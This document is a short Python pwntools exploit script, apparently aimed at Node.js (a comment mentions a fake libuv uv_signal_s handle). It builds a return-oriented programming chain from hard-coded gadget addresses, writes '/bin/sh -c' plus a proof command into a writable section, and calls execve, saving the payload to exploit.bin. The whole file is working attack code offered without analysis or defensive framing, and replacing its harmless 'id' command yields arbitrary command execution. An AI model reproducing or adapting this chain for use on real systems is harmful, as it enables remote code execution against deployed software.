# NODE 24

from pwn import *

context.arch = "amd64"

PROOF_CMD = "id>/tmp/pwned" 
PIVOT_GADGET = 0x5282c23  # fake uv_signal_s handle pointer
SIGNUM = 0x0000000  # must equal dword at PIVOT_GADGET+0x68
RW_SECTION = 0x67F0000  # BSS section (writable, zero-initialized)
SYSCALL = 0x16c2321  # syscall
POP_RAX = 0x1067d34  # pop rax; ret
POP_RDI = 0x1147372  # pop rdi; ret
POP_RSI = 0x160543e  # pop rsi; ret
POP_RDX = 0x103283a  # pop rdx; ret
MOV_GADGET = 0x11d0e30  # mov qword ptr [rdi], rsi ; ret


def gadget_write_at(addr, qword):
    if isinstance(qword, bytes):
        if len(qword) > 8:
            raise ValueError("qword cannot be larger than 8 bytes")
        qword = qword.ljust(8, b"\x00")
    yield POP_RDI
    yield addr
    yield POP_RSI
    yield qword
    yield MOV_GADGET

def gadget_create_string(addr, s):
    s = s.encode() + b"\x00"
    for i in range(0, len(s), 8):
        yield from gadget_write_at(addr + i, s[i:i+8])


if __name__ == "__main__":
    argv = [RW_SECTION+0x100, RW_SECTION+0x200, RW_SECTION+0x300]
    argv_arr = RW_SECTION

    content = flat([
        # Start ROP chain
        PIVOT_GADGET,
        SIGNUM,

        # Write execve() arguments
        *gadget_create_string(argv[0], "/bin/sh"),
        *gadget_create_string(argv[1], "-c"),
        *gadget_create_string(argv[2], PROOF_CMD),
        #! Warning: due to limited chain size, the command needs to be pretty short

        # Create argv[] array
        *gadget_write_at(argv_arr, argv[0]),
        *gadget_write_at(argv_arr + 8, argv[1]),
        *gadget_write_at(argv_arr + 16, argv[2]),

        # Run execve syscall
        POP_RAX,
        constants.SYS_execve,
        POP_RDI,
        argv[0],
        POP_RSI,
        argv_arr,
        POP_RDX,
        0,
        SYSCALL,
    ])

    with open("exploit.bin", "wb") as f:
      f.write(content)
